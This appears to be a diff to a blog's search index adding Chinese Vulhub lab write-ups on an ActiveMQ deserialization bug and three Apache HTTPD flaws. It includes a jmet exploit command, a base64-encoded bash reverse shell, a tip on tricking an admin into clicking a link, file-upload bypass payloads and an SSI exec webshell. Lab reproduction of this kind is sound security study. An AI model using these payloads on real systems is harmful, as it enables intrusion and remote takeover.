@@ -927,4 +927,124 @@
         <tag>不安全的序列化</tag>
       </tags>
   </entry>
+  <entry>
+    <title>ActiveMQ反序列化漏洞（CVE-2015-5254）</title>
+    <url>/2021/04/15/ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="ActiveMQ反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ反序列化漏洞（CVE-2015-5254）</h1><p>​    Apache ActiveMQ是由美国Pachitea（Apache）软件基金会开发的一种开源消息中间件，它支持Java消息服务，集群，Spring框架等。</p>
+<p>​    Apache ActiveMQ版本5.x之前的5.13.0安全漏洞，该程序引起的漏洞并不限制可以在代理中序列化的类。远程攻击者可以使特殊的序列化Java消息服务（JMS）ObjectMessage对象利用此漏洞来执行任意代码。</p>
+<a id="more"></a>
+
+<p>运行环境后，它将在端口61616和8161上建立两个端口。端口61616是工作端口，消息在此端口上传递。端口8161是网页管理页面端口。访问<code>http://192.168.44.132:8161</code>，您可以看到网络管理页面，但是从理论上讲该漏洞不需要网络。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>漏洞利用过程如下：</p>
+<ol>
+<li>生成序列化的有效负载（你可以使用ysoserial）</li>
+<li>将有效载荷发送到端口61616</li>
+<li>访问Web管理页面并阅读序列化消息，然后您可以触发漏洞。</li>
+</ol>
+<p>为了利用此环境，我们将使用<a href="https://github.com/matthiaskaiser/jmet" target="_blank" rel="noopener">jmet</a>（Java消息利用工具）。首先下载jmet的jar文件，并在同一目录中创建名为<strong>external的</strong>文件夹（否则可能会出现该文件夹不存在的错误）。</p>
+<p>jmet是使用ysoserial生成并发送有效载荷（jar随ysoserial一起提供，我们不需要再次下载它），因此我们需要选择一个可以在ysoserial中用作小工具的对象，例如ROME 。</p>
+<p>执行：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;success&quot; -Yp ROME 192.168.44.132 61616</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210420/16188727678144.png" alt="image-20210420045506964"></p>
+<p>此时，一个名为事件的队列将被添加到目标ActiveMQ。</p>
+<p>您可以访问<code>http://192.168.44.132:8161/admin/browse.jsp?JMSDestination=Event</code>以查看此队列中的所有消息</p>
+<p>（<strong>登录名/密码：</strong> admin / admin）：</p>
+<p><img src="https://image.3001.net/images/20210420/16188727695815.png" alt="image-20210420051032493"></p>
+<p>单击此消息以触发命令执行，</p>
+<p><img src="https://image.3001.net/images/20210420/16188727719315.png" alt="image-20210420052010390"></p>
+<p>这次进入容器<code>docker-compose exec activemq bash</code>，</p>
+<p>我们可以看到/ tmp / success已成功创建，表明利用成功：</p>
+<p><img src="https://image.3001.net/images/20210420/16188727754408.png" alt="image-20210420051326031"></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>把反弹shell的命令进行base64编码</p>
+<p><img src="https://image.3001.net/images/20210420/16188727778776.png" alt="image-20210420055255231"></p>
+<p>把编码放进去。<br>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ0LjEzMi8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}</p>
+<p>最终命令为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ0LjEzMi8xMjM0IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 192.168.44.132 61616</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210420/16188727802590.png" alt="image-20210420055630353"></p>
+<p>再通过管理界面单击消息以触发命令执行，成功进入root权限</p>
+<p><img src="https://image.3001.net/images/20210420/1618872782104.png" alt="image-20210420055539067"></p>
+<p>值得注意的是，通过Web管理页面访问消息并触发漏洞需要管理员特权。在没有密码的情况下，我们可以诱使管理员访问我们的链接以进行触发，或者伪装成来自其他服务的合法消息需要在触发时等待客户端访问。</p>
+]]></content>
+      <categories>
+        <category>Vulhub复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>ActiveMQ</tag>
+        <tag>CVE-2015-5254</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
+    <url>/2021/04/20/Apache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h1><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>上传一个名为1.php的文件，被拦截：</p>
+<p><img src="https://image.3001.net/images/20210420/16188726507583.png" alt="image-20201020020712805"></p>
+<p>在1.php后面插入一个<code>\x0A</code>（注意，不能是<code>\x0D\x0A</code>，只能是一个<code>\x0A</code>），不再拦截：</p>
+<p><img src="https://image.3001.net/images/20210420/16188726521450.png" alt="image-20201020021215126"></p>
+<p>访问刚才上传的<code>/1.php%0a</code>，发现能够成功解析，但这个文件不是php后缀，说明目标存在解析漏洞：</p>
+<p><img src="https://image.3001.net/images/20210420/1618872656333.png" alt="image-20201020021257808"></p>
+]]></content>
+      <categories>
+        <category>Vulhub复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Apache</tag>
+        <tag>CVE-2017-15715</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache HTTPD 多后缀解析漏洞</title>
+    <url>/2021/04/21/Apache%20HTTPD%20%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h1><a id="more"></a>
+
+<p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType text&#x2F;html .html</span><br><span class="line">AddLanguage zh-CN .cn</span><br></pre></td></tr></table></figure>
+
+<p>其给<code>.html</code>后缀增加了media-type，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件<code>index.cn.html</code>，他将返回一个中文的html页面。</p>
+<p>以上就是Apache多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddHandler application&#x2F;x-httpd-php .php</span><br></pre></td></tr></table></figure>
+
+<p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境运行后，访问<code>http://your-ip/uploadfiles/apache.php.jpeg</code>即可发现，phpinfo被执行了，该文件被解析为php脚本。</p>
+<p><code>http://your-ip/index.php</code>中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为<code>xxx.php.jpg</code>或<code>xxx.php.jpeg</code>的文件，利用Apache解析漏洞进行getshell。</p>
+<p><img src="https://image.3001.net/images/20210420/16188726916210.png" alt="image-20201020023156918"></p>
+<p><img src="https://image.3001.net/images/20210420/1618872693636.png" alt="image-20201020023237068"></p>
+]]></content>
+      <categories>
+        <category>Vulhub复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Apache</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache SSI 远程命令执行漏洞</title>
+    <url>/2021/04/13/Apache%20SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Apache-SSI-远程命令执行漏洞"><a href="#Apache-SSI-远程命令执行漏洞" class="headerlink" title="Apache SSI 远程命令执行漏洞"></a>Apache SSI 远程命令执行漏洞</h1><p>在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>语法执行任意命令。</p>
+<a id="more"></a>
+
+<p>环境启动后，访问<code>http://your-ip:8080/upload.php</code>，即可看到一个上传表单。</p>
+<p><img src="https://image.3001.net/images/20210420/1618872602739.png" alt="image-20201020011344884"></p>
+<p>正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;ls&quot; --&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210420/16188726054506.png" alt="image-20201020012001079"></p>
+<p>成功上传，然后访问shell.shtml，可见命令已成功执行：</p>
+<p><img src="https://image.3001.net/images/20210420/16188726075102.png" alt="image-20201020012058471"></p>
+]]></content>
+      <categories>
+        <category>Vulhub复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Apache</tag>
+      </tags>
+  </entry>
 </search>
